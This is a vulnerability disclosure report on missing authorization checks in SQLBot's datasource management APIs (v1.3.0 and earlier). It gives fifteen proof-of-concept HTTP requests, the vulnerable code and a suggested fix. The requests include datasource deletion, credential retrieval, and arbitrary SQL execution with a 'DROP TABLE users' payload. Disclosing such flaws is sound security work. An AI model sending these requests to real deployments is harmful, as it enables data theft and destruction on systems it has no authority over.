# Missing Authorization in Datasource Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Datasource Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains multiple missing authorization vulnerabilities in the Datasource Management APIs, allowing any authenticated user to retrieve datasource configurations, check datasource connections, delete datasources, select tables, get table/field lists, execute arbitrary SQL queries, and modify table/field configurations without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - Retrieve sensitive datasource configurations (database credentials)
  - Delete datasources causing service disruption
  - Execute arbitrary SQL queries on connected databases
  - Modify table and field configurations
  - Access and export data from any datasource
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Get Datasource Configuration (POST /datasource/get/{id})

```http
POST /api/v1/datasource/get/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns datasource configuration without authorization check.

### PoC 2: Check Datasource Connection (POST /datasource/check)

```http
POST /api/v1/datasource/check HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "test",
    "type": "postgresql",
    "host": "localhost",
    "port": 5432,
    "database": "test",
    "username": "admin",
    "password": "password"
}
```

**Result:** Checks datasource connection without authorization check.

### PoC 3: Check Datasource by ID (GET /datasource/check/{ds_id})

```http
GET /api/v1/datasource/check/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Checks datasource status without authorization check.

### PoC 4: Delete Datasource (POST /datasource/delete/{id})

```http
POST /api/v1/datasource/delete/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Deletes datasource without authorization check.

### PoC 5: Choose Tables (POST /datasource/chooseTables/{id})

```http
POST /api/v1/datasource/chooseTables/1 HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

[
    {"name": "users", "comment": ""}
]
```

**Result:** Modifies selected tables without authorization check.

### PoC 6: Get Tables (POST /datasource/getTables/{id})

```http
POST /api/v1/datasource/getTables/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns table list without authorization check.

### PoC 7: Get Tables by Configuration (POST /datasource/getTablesByConf)

```http
POST /api/v1/datasource/getTablesByConf HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "type": "postgresql",
    "host": "localhost",
    "port": 5432,
    "database": "test",
    "username": "admin",
    "password": "password"
}
```

**Result:** Returns tables from specified datasource without authorization check.

### PoC 8: Get Schema by Configuration (POST /datasource/getSchemaByConf)

```http
POST /api/v1/datasource/getSchemaByConf HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "type": "postgresql",
    "host": "localhost",
    "port": 5432,
    "database": "test",
    "username": "admin",
    "password": "password"
}
```

**Result:** Returns schema information without authorization check.

### PoC 9: Get Fields (POST /datasource/getFields/{id}/{table})

```http
POST /api/v1/datasource/getFields/1/users HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns field list without authorization check.

### PoC 10: Execute Arbitrary SQL (POST /datasource/execSql/{id}) - CRITICAL

```http
POST /api/v1/datasource/execSql/1 HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "sql": "SELECT * FROM users; DROP TABLE users;--"
}
```

**Result:** Executes arbitrary SQL query without authorization check. This can lead to data exfiltration or data destruction.

### PoC 11: Get Table List (POST /datasource/tableList/{id})

```http
POST /api/v1/datasource/tableList/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns table list without authorization check.

### PoC 12: Get Field List (POST /datasource/fieldList/{id})

```http
POST /api/v1/datasource/fieldList/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns field list without authorization check.

### PoC 13: Edit Local Comment (POST /datasource/editLocalComment)

```http
POST /api/v1/datasource/editLocalComment HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "tableId": 1,
    "tableName": "users",
    "fields": []
}
```

**Result:** Modifies table comments without authorization check.

### PoC 14: Edit Table (POST /datasource/editTable)

```http
POST /api/v1/datasource/editTable HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "modified_table",
    "comment": "modified"
}
```

**Result:** Modifies table configuration without authorization check.

### PoC 15: Edit Field (POST /datasource/editField)

```http
POST /api/v1/datasource/editField HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "modified_field",
    "comment": "modified"
}
```

**Result:** Modifies field configuration without authorization check.

## 8. Vulnerable Code Location

**File:** `backend/apps/datasource/api/datasource.py`

| Endpoint | Method | Lines | Description |
|----------|--------|-------|-------------|
| /datasource/get/{id} | POST | 41-43 | Get datasource configuration |
| /datasource/check | POST | 46-51 | Check datasource connection |
| /datasource/check/{ds_id} | GET | 54-59 | Check datasource by ID |
| /datasource/delete/{id} | POST | 86-88 | Delete datasource |
| /datasource/chooseTables/{id} | POST | 70-75 | Select tables |
| /datasource/getTables/{id} | POST | 91-93 | Get table list |
| /datasource/getTablesByConf | POST | 96-111 | Get tables by config |
| /datasource/getSchemaByConf | POST | 114-129 | Get schema by config |
| /datasource/getFields/{id}/{table} | POST | 132-134 | Get field list |
| /datasource/execSql/{id} | POST | 145-158 | **Execute arbitrary SQL** |
| /datasource/tableList/{id} | POST | 161-163 | Get table list |
| /datasource/fieldList/{id} | POST | 166-168 | Get field list |
| /datasource/editLocalComment | POST | 171-173 | Edit comments |
| /datasource/editTable | POST | 176-178 | Edit table |
| /datasource/editField | POST | 181-183 | Edit field |

### Example Vulnerable Code: Execute SQL (Lines 145-158)

```python
@router.post("/execSql/{id}")
async def exec_sql(session: SessionDep, id: int, obj: TestObj):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    def inner():
        data = execSql(session, id, obj.sql)  # Executes arbitrary SQL!
        # ...
        return data
    return await asyncio.to_thread(inner)
```

## 9. Remediation

Add proper authorization checks to all affected endpoints. Example fix:

```python
from common.core.deps import CurrentUser

@router.post("/execSql/{id}")
async def exec_sql(session: SessionDep, current_user: CurrentUser, trans: Trans, id: int, obj: TestObj):
    if not current_user.isAdmin and current_user.weight == 0:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # Verify user has access to this datasource
    ds = get_ds(session, id)
    if ds.oid != current_user.oid and not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # ... rest of the code
```

## 10. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /datasource/get/{id} | POST | Medium | Get datasource config |
| /datasource/check | POST | Medium | Check connection |
| /datasource/check/{ds_id} | GET | Medium | Check datasource status |
| /datasource/delete/{id} | POST | **Critical** | Delete datasource |
| /datasource/chooseTables/{id} | POST | High | Select tables |
| /datasource/getTables/{id} | POST | Medium | Get table list |
| /datasource/getTablesByConf | POST | Medium | Get tables by config |
| /datasource/getSchemaByConf | POST | Medium | Get schema |
| /datasource/getFields/{id}/{table} | POST | Medium | Get field list |
| /datasource/execSql/{id} | POST | **Critical** | **Execute arbitrary SQL** |
| /datasource/tableList/{id} | POST | Medium | Get table list |
| /datasource/fieldList/{id} | POST | Medium | Get field list |
| /datasource/editLocalComment | POST | High | Edit comments |
| /datasource/editTable | POST | High | Edit table config |
| /datasource/editField | POST | High | Edit field config |

## 11. Special Note on SQL Execution Vulnerability

The `/datasource/execSql/{id}` endpoint is particularly critical because it allows execution of **arbitrary SQL queries** on any connected datasource. An attacker could:
- Exfiltrate sensitive data from databases
- Modify or delete data
- Execute destructive queries (DROP TABLE, TRUNCATE, etc.)
- Potentially achieve remote code execution on certain database configurations
